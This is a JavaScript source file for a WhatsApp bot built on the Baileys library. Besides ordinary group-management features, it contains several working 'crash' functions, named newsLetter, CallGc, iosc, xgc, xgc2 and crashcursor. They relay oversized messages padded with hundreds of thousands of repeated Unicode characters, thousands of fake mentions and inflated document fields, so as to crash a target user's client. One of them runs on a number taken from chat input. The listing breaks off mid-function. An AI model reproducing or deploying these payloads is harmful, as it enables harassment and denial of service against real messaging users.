/*

› Case coded by T𝗵Ⓤ𝖌🅝︎Ⓘ︎🄵🅸︎ᥴe͟n⃠𝚝

                 
*/

//=================================================//

//SET STICKER TO IMPROVE THE TAKE COMMAND TO JUST ACCEPT ONLY NAMES AND NOT BOT NAME
//TAKE ANTISPAM FROM LORENZO AND CHANGE THE CODE TO A SIMPLER ONE 
// when you're done cross check XeonBotInc replygcxeon LorenzoBotInc replygcLorenzo ptz XliconStick XeonStick LorenzoStick
// Add Shazam 
require('./lib/listmenu')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./lib/converter')
const crypto = require('crypto');
const makeid = crypto.randomBytes(3).toString('hex');

require('./settings')
const { modul } = require('./module')
const jsobfus = require('javascript-obfuscator');
const yts = require('yt-search')
const { TelegraPH } = require("./lib/TelegraPH")
const { chatGpt, tiktokDl, ytMp4, ytMp3 } = require('./lib/screaper');
const path = require('path');
const {translate} = require('@vitalets/google-translate-api')
const eco = require('discord-mongoose-economy');
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, SecondNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const emojiRegex = require('emoji-regex');
const { v4: uuidv4 } = require('uuid')
const { GIFBufferToVideoBuffer} = require('./lib/myfunc2')
const uploadImage = require('./lib/catbox');
    const chalk = require("chalk");
    const {
    addPremiumUser,
    getPremiumExpired,
    getPremiumPosition,
    expiredPremiumCheck,
    checkPremiumUser,
    getAllPremiumUser,
} = require('./lib/premiun')
const { exec, spawn, execSync } = require("child_process")
const fsx = require('fs-extra')
const util = require('util')
const fetch = require('node-fetch')
const FormData = require('form-data')
const axios = require('axios')
const cheerio = require('cheerio')
const { performance } = require("perf_hooks");
const process = require('process');
const moment = require("moment-timezone")
const os = require('os');
const ytdl = require('@distube/ytdl-core');
const checkDiskSpace = require('check-disk-space').default;
const speed = require('performance-now')
const { Thug_antispam } = require('./lib/antispam')
const more = String.fromCharCode(8206);
const readmore = more.repeat(4800)
const { jadibot, conns } = require("./lib/jadibot")
const { addExif } = require('./lib/exif')
const fs = require("fs")
let _leveling = JSON.parse(fs.readFileSync('./database/leveling.json'))
let _level = JSON.parse(fs.readFileSync('./database/level.json'))
const {
  generateWAMessage,
  useMultiFileAuthState,
  areJidsSameUser,
  proto,
  downloadContentFromMessage,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  makeWASocket,
  generateWAMessageContent
} = require("@adiwajshing/baileys");
const xeonverifieduser = JSON.parse(fs.readFileSync('./database/user.json'))
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))

const { bytesToSize, checkBandwidth, formatSize, jsonformat, nganuin, runtime, shorturl, formatp, color, getGroupAdmins } = require("./myfunc");
const wangy = fs.readFileSync('./T-Media/Oreki.jpg')
const moon = fs.readFileSync('./T-Media/Oreki20.jpg')
const { maker } = modul
const {
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    fetchBuffer,
    buffergif,
    totalcase
} = require('./myfunc')
const bug = fs.readFileSync(`./T-Media/bug.mp3`)
const pici = fs.readFileSync('./T-Media/Oreki26.jpg')	
module.exports = ThugBotInc = async (ThugBotInc, m, chatUpdate, store) => {
    try {  
        // Extract message type and content
        const messageType = m.mtype; // Detect message type
        const participant = m.sender; // Sender of the message
        // Fix for `m.isGroup` assignment
        if (!('isGroup' in m)) {
            m.isGroup = m.key.remoteJid.endsWith('@g.us');
        }
        const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}

const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./T-Media/Oreki.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
const val = { ...m };
const msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message || null;

        // Extracting message properties
 var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
       const frommeky = m.key.remoteJid;  
const from = frommeky; // Define 'from' properly
 
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        //prefix 1
        var prefix = ['.','','/'] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "." : prefix
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : prefix
        const isCommand = body.startsWith(pric)
  ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase()
  : "";
        const isCmd = body.startsWith(prefix, '')
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';    
        const isCmd2 = body.startsWith(prefix)
        const command2 = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await ThugBotInc.decodeJid(ThugBotInc.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        //media
        const isMedia = /image|video|sticker|audio/.test(mime)
       
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        
        
        const sticker = []
       //group
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await ThugBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        //anti media
        const isXeonMedia = m.mtype
        //user status
        const isUser = xeonverifieduser.includes(sender)
        const ThugTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium= ThugTheCreator || checkPremiumUser(m.sender, premium)
        expiredPremiumCheck(ThugBotInc, m, premium)
let fstatus = { 
    key: { 
        fromMe: false, 
        participant: `0@s.whatsapp.net`,  
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}) 
    }, 
    message: {  
        "imageMessage": { 
            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", 
            "mimetype": "image/jpeg", 
            "caption": botname, // Fixed syntax
            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", 
            "fileLength": 28777, // Number, not string
            "height": 1080,
            "width": 1079,
            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
            "mediaKeyTimestamp": 1610993486, // Number, not string
            "jpegThumbnail": await reSize(thumb, 100, 100), // Ensure this is inside an async function
            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
        }
    }
};
            
         

// This function will update the participants' roles based on the action ('promote' or 'demote')
async function updateParticipants(action, participants, chatId) {
    try {
        // Perform the action: promote or demote
        if (action === "promote") {
            // Promote each participant
            await ThugBotInc.groupParticipantsUpdate(chatId, participants, 'promote');
        } else if (action === "demote") {
            // Demote each participant
            await ThugBotInc.groupParticipantsUpdate(chatId, participants, 'demote');
        } else {
            console.error(`Unknown action: ${action}`);
            throw new Error(`Unknown action: ${action}`);
        }
    } catch (error) {
        console.error(`Error in updateParticipants for action '${action}':`, error);
        throw error; // Re-throw the error to be handled by the calling function
    }
}
// Event listener for group participant updates (e.g., welcome or farewell)
ThugBotInc.ev.on('group-participants.update', async (anu) => {
    if (global.welcome) {
        console.log(anu); // Logs the participant update event for debugging

        try {
            // Fetch group metadata
            let metadata = await ThugBotInc.groupMetadata(anu.id);
            let participants = anu.participants; // Array of participants involved in the update

            // Loop through all participants in the update
            for (let num of participants) {
                let ppuser, ppgroup;

                try {
                    // Fetch participant's profile picture
                    ppuser = await ThugBotInc.profilePictureUrl(num, 'image');
                } catch (err) {
                    // Default profile picture if fetching fails
                    ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60';
                }

                try {
                    // Fetch group profile picture
                    ppgroup = await ThugBotInc.profilePictureUrl(anu.id, 'image');
                } catch (err) {
                    // Default group profile picture if fetching fails
                    ppgroup = 'https://i.ibb.co/RBx5SQC/avatar-group-large-v2.png?q=60';
                }

                // Number of members in the group
                let memb = metadata.participants.length;

                // Welcome message
                if (anu.action === 'add') {
                    const ThugWlcm = await getBuffer(ppuser);
                    let ThugName = num;
                    const xtime = moment.tz('Africa/Lagos').format('HH:mm:ss');
                    const xdate = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
                    const Thugmembers = memb;

                    let Thugbody = `╔═══════ ༻❁༺ ═══════╗  
            *「 Welcome 😊 」*  
╚═══════ ༻❁༺ ═══════╝  

╭── ❀ *Details* ❀ ──╮  
│ ✧ *Username*:  
│   @${ThugName.split("@")[0]}  
│  
│ ✧ *Group*:  
│   *${metadata.subject}*  
│  
│ ✧ *Member*:  
│   ${Thugmembers}th  
│  
│ ✧ *Time*:  
│   *${xtime} | ${xdate}*  
╰── ❀ *Status: User joined the group* ❀ ──╯  
︎`;

                    await ThugBotInc.sendMessage(anu.id, {
                        text: Thugbody,
                        contextInfo: {
                            mentionedJid: [num],
                            externalAdReply: {
                                showAdAttribution: true,
                                containsAutoReply: true,
                                title: `${global.botname}`,
                                body: `${ownername}`,
                                previewType: "PHOTO",
                                thumbnail: ThugWlcm,
                                sourceUrl: `${wagc}`
                            },
                        },
                    });
                }

                // Farewell message
                else if (anu.action === 'remove') {
                    const ThugLft = await getBuffer(ppuser);
                    const Thugtime = moment.tz('Africa/Lagos').format('HH:mm:ss');
                    const Thugdate = moment.tz('Africa/Lagos').format('DD/MM/YYYY');
                    let ThugName = num;
                    const Thugmembers = memb;

                    let Thugbody = `╔═══════ ༻❁༺ ═══════╗  
            *「 Goodbye 😥 」*  
╚═══════ ༻❁༺ ═══════╝  

╭── ❀ *Details* ❀ ──╮  
│ ✧ *Username*:  
│   @${ThugName.split("@")[0]}  
│  
│ ✧ *Group*:  
│   *${metadata.subject}*  
│  
│ ✧ *Member*:  
│   *${Thugmembers}th*
│  
│ ✧ *Time*:  
│   *${xtime} | ${xdate}*  
╰── ❀ *Status: User Left the group* ❀ ──╯  
 
`;

                    await ThugBotInc.sendMessage(anu.id, {
                        text: Thugbody,
                        contextInfo: {
                            mentionedJid: [num],
                            externalAdReply: {
                                showAdAttribution: true,
                                containsAutoReply: true,
                                title: `${global.botname}`,
                                body: `${ownername}`,
                                previewType: "PHOTO",
                                thumbnail: ThugLft,
                                sourceUrl: `${wagc}`
                            },
                        },
                    });
                }
            }
        } catch (err) {
            console.error('Error processing group participant update:', err);
        }
    }
});


// Anti Call
ThugBotInc.ev.on('call', async (ThugPapa) => {
    if (global.anticall) {
        console.log(ThugPapa);
        for (let ThugFucks of ThugPapa) {
            if (ThugFucks.isGroup == false) {
                if (ThugFucks.status == "offer") {
                    let ThugBlokMsg = await ThugBotInc.sendTextWithMentions(
                        ThugFucks.frommeky, 
                        `*${ThugBotInc.user.name}* can't receive ${ThugFucks.isVideo ? 'video' : 'voice'} calls right now. Sorry @${ThugFucks.from.split('@')[0]}, you will be blocked. If called accidentally, please contact the owner to be unblocked!`
                    );
                    ThugBotInc.sendContact(ThugFucks.frommeky, owner, ThugBlokMsg);
                    await sleep(8000);
                    await ThugBotInc.updateBlockStatus(ThugFucks.frommeky, "block");
                }
            }
        }
    }
});
const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}
const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐏𝐫𝐞𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"𝐏𝐫𝐞𝐥𝐕𝟐\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐏𝐫𝐞𝐥𝐗𝐳 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
}
const target = `${q ?? text}@s.whatsapp.net`;
 // Replace with the actual recipient
newsLetter1(target);
async function newsLetter1(target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "𝙾𝚁𝙴𝙺𝙸 𝚅2 🕊️🕊️🕊️" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await ThugBotInc.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log('eror');
            }
        }
        
  async function CallGc(target) {
await ThugBotInc.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    scheduledCallCreationMessage: {
                        callType: "VIDEO",
                        scheduledTimestampMs: Date.now() + 9741,
                        title: " Tama Crash Calls " + `𑲭𑲭`.repeat(100000) + `ꦾ`.repeat(50000),
                        inviteCode: 'youtube.com/@tamainfinity',
                    }
                }
            }
        }, {});
      }      
        
        
 async function newsLetter(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆" + "ꦾ".repeat(120000),
                        jpegThumbnail: null,
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                        nativeFlowMessage: {},
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: `{"title":"𝙾𝚁𝙴𝙺𝙸 𝚅2 🕊️🕊️🕊️  ◄${"᬴".repeat(60000)}","sections":[{"title":"# BOOM̷","rows":[]}]}`
                            },
                        ],
                        mentionedJid: ["254742491666@s.whatsapp.net"],
                    },
                },
            },
        };

        await ThugBotInc.relayMessage(target, messsage, {
            userJid: target,
        });
    } catch (err) {
        console.log('err');
    }
}
    
async function sendOfferCall(target) {

    try {

        await ThugBotInc.offerCall(target);

        console.log(chalk.white.bold(`Success Send Offer Call To Target`));

    } catch (error) {

        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));

    }

}

async function sendOfferVideoCall(target) {

    try {

        await ThugBotInc.offerCall(target, { 

        video: true 

        });

        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));

    } catch (error) {

        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));

    }

}
//
async function iosc(target, Ptcp = true) {
ThugBotInc.relayMessage(
    target,
    {
        extendedTextMessage: {
            text: `𑲭𑲭? ${'ꦾ'.repeat(103000)} ${'@13135550002'.repeat(25000)}`,
            contextInfo: {
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "13135550002@s.whatsapp.net",
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: "1",
                        durationSecs: "0",
                        callType: "REGULAR",
                        participants: [
                            {
                                jid: "13135550002@s.whatsapp.net",
                                callOutcome: "1"
                            }
                        ]
                    }
                },
                remoteJid: "13135550002@s.whastapp.net",
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 99999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "Example Advertiser",
                    mediaType: "IMAGE",
                    jpegThumbnail: Jepeg,
                    caption: "This is an ad caption"
                },
                placeholderKey: {
                    remoteJid: "13135550002@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                    title: "FINIX - CRITICAL FINISH",
                    body: `Ai To Crash ${'\0'.repeat(200)}`,
                    mediaType: "VIDEO",
                    renderLargerThumbnail: true,
                    previewType: "VIDEO",
                    thumbnail: Jepeg,
                    sourceType: "x",
                    sourceId: "x",
                    sourceUrl: "https://www.facebook.com/WhastApp",
                    mediaUrl: "https://www.facebook.com/WhastApp",
                    containsAutoReply: true,
                    showAdAttribution: true,
                    ctwaClid: "ctwa_clid_example",
                    ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                    url: "https://www.facebook.com/WhatsApp"
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "13135550002@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                    utmSource: "utm_source_example",
                    utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "13135550002@newsletter",
                    serverMessageId: 1,
                    newsletterName: "Meta Ai",
                    contentType: "UPDATE",
                    accessibilityText: "Meta Ai"
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                smbriyuCampaignId: "smb_riyu_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                    showMmDisclosure: true
                }
            }
        }
    },
    Ptcp
        ? {
              participant: {
                  jid: target 
              }
          }
        : {}
       
);
console.log("Success! Force Ios Sent")
}



async function xgc(target){
	ThugBotInc.relayMessage(target,{                viewOnceMessage: {
message: {
                        messageContextInfo: {
                            deviceListMetadataVersion: 2,
                            deviceListMetadata: {},
                        }, 
    "extendedTextMessage": {
        "text": "madara come cu do UrsoZiingod" ,
        "previewType": true,
        "contextInfo": {
            "stanzaId": "B69F7CFEE38571AB03CD9DEEFAD69605",
            "participant": "5518998215209@s.whatsapp.net",
            "quotedMessage": { "documentMessage": {"url":"https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true","mimetype":"application/pdf","fileSha256":"oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=","fileLength":null,"pageCount":99999999999999,"contactVcard":true,"caption":'͡𑰵',"mediaKey":"yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=","fileName": '> cart; ',"fileEncSha256":"0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=","directPath":"/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0","mediaKeyTimestamp":"1714145232","thumbnailDirectPath":"/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0","thumbnailSha256":"oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=","thumbnailEncSha256":"G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=","jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==","thumbnailHeight":172,"thumbnailWidth":480},forwardingScore: 508,isForwarded: true,forwardedNewsletterMessageInfo: {newsletterJid: "0@newsletter",serverMessageId: 100,newsletterName:"🚔 > ursoziingod & crash;"}}}},
       }}},{})
	}
	
	async function xgc2(target){
		await ThugBotInc.relayMessage(target, {
'groupInviteMessage': {
"inviteExpiration": Math.floor(Date.now() / 1000) + 31536000,
"groupName":` 𝙾𝚁𝙴𝙺𝙸 𝚅2 🕊️🕊️🕊️`.repeat(1500),
'groupJid': '120363047626537933@g.us',
'inviteExpiration': '999',
'caption': '> ㅤㅤㅤㅤㅤㅤㅤ',
"inviteCode": 'h+64P9RhJDzgXSPf',
'contextInfo': {
'isForwarded': true,
'fromMe': false,
'participant': '0@s.whatsapp.net',
'remoteJid': sender,
'quotedMessage': {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
mimetype: "application/pdf",
title: "crash",
pageCount: 1000000000,
fileName: "crash.pdf".repeat(1500),
contactVcard: true
}
},
'forwardedNewsletterMessageInfo': {
'newsletterJid': '120363222395675670@newsletter',
'serverMessageId': 1,
'newsletterName': "𝙾𝚁𝙴𝙺𝙸 𝚅2 🕊️🕊️🕊️".repeat(1500)
}
}
}
}, {});
		}


	


		
//
async function crashcursor(target) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "hello sup i have a message for you " + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
contextInfo: {
stanzaId: ThugBotInc.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "bless",
